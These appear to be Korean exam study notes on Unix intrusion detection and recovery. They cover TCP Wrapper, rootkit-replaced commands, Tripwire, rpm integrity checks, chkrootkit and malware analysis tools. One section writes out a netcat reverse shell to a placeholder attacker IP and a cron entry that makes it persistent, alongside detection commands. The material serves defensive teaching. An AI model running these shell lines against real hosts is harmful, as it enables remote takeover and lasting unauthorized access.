## TCP Wrapper (2-6)

유닉스 호스트 기반 접근제어(방화벽 룰). `libwrap` 을 사용하는 서비스(inetd/xinetd 계열, sshd 등)에 적용.

- `/etc/hosts.allow` : 허용 정책 (먼저 평가)
- `/etc/hosts.deny` : 거부 정책
- 평가 순서: allow → deny → (둘 다 없으면) 허용. `ALL: ALL` 을 deny에 넣고 allow에서 최소 허용.
- `tcpd` 데몬이 접근을 중계하며 `/var/log/secure` 에 로그.

## 루트킷에 장악된 시스템 — 신뢰할 수 없는 기본 명령어

`ps`, `ls`, `netstat`, `find` 등이 트로이목마로 교체될 수 있음 → 대체 수단으로 교차 확인.

| 목적 | 오염 가능 명령 | 대체 |
|---|---|---|
| 프로세스 목록 | `ps` | **`lsof`**, `/proc` 직접 탐색, `ls /proc` |
| 열린 파일/포트 | `netstat` | `lsof -i`, `ss` |
| 파일 목록 | `ls` | `echo *`, `find`(신뢰 매체) |

### 삭제된 실행 파일을 가진 은닉 프로세스 (15-12)

`ls -al /proc/<PID>/exe -> /path/backdoor (deleted)` 형태.
- 이유: 공격자가 프로세스 실행 후 실행 파일을 삭제 → 경로에는 파일이 없지만 프로세스는 살아있음.
- 복구: `cp /proc/<PID>/exe /tmp/sample` 로 바이너리 추출.
- 실행 인자 확인: `cat /proc/<PID>/cmdline`, `history`.

## Tripwire 동작 절차 (순서 암기)

1. `tripwire --init` → 기준(Baseline) 파일 해시 DB 생성
2. (정상 운영)
3. `tripwire --check` → 현재 파일 해시와 기준 DB 비교
4. 변경된 파일 목록을 리포트로 출력

DB 저장 위치: `/var/lib/tripwire/*.twd`. **DB·바이너리 자체가 변조되면 무의미**하므로 읽기전용 매체(WORM)에 별도 보관하는 것이 원칙.

## rpm 기반 무결성 검사 — 루트킷이 `ps`·`netstat`를 변조했을 때

```bash
rpm -qf /bin/netstat /bin/ps        # ① 해당 파일이 속한 패키지 확인 (net-tools, procps)
rpm -V net-tools procps             # ② 패키지 무결성 검증(변조 여부)
lsattr /bin/netstat /bin/ps         # ③ immutable 플래그 확인
chattr -i /bin/netstat /bin/ps      # ④ immutable 해제(공격자가 걸어뒀을 수 있음)
rpm -Uvh --force [패키지명]          # ⑤ 강제 재설치로 원본 복구
chattr +i /bin/netstat /bin/ps      # ⑥ 복구 후 재변조 방지
```

**`rpm -V` 출력 코드**: `S`=크기변경 `M`=권한(모드)변경 **`5`=MD5 체크섬 불일치(변조 확실)** `T`=타임스탬프변경 `U`=소유자변경 `G`=그룹변경 `L`=심볼릭링크변경.

## chkrootkit

```bash
chkrootkit -q     # quiet 모드 — 이상 항목만 출력
# INFECTED: /bin/ps      → ps 명령어가 루트킷으로 변조됨
```

`ps`가 은닉한 프로세스도 `/proc/[PID]/exe`·`/proc/[PID]/cmdline`을 직접 열람하면 드러난다(`ps` vs `/proc` 결과 불일치 = 루트킷 의심).

## nc(Netcat) 리버스 셸 + cron 지속성 (기출 시나리오 단골)

```bash
# 공격자 서버: 리스닝
nc -lvp 80
# 피해 서버(침해 후): 역방향 접속
nc [공격자IP] [Port] -e /bin/bash
# cron 등록으로 재부팅 후에도 지속성 유지
echo "30 2 * * * root /usr/bin/nc [공격자IP] [Port] -e /bin/bash" >> /etc/crontab
```

탐지: `ps -ef | grep nc`, `netstat -antp | grep [공격자IP]`(외부 비정상 연결), `/var/log/cron`·`cat /etc/crontab`(악성 등록 확인).

## 분석 명령·도구

- **strace**: 프로세스의 **시스템 콜** 추적 (`strace -e trace=open,read ...`). 바이너리의 컴파일 경로·행위로 트로이목마 식별. (ltrace는 라이브러리 콜)
- **정적 분석**: PEiD(패커 식별), IDA Pro(디스어셈블), YARA(시그니처 룰) — 파일 헤더·섹션·코드 패턴을 자동 분석
- **동적 분석**: Cuckoo Sandbox 등 격리 환경에서 실행 관찰
- **샌드박스(Sandbox)**: 가상화로 격리한 테스트 환경에서 악성 파일을 실행해 실제 시스템 피해를 막고 행위를 분석하는 기술 (32-12)
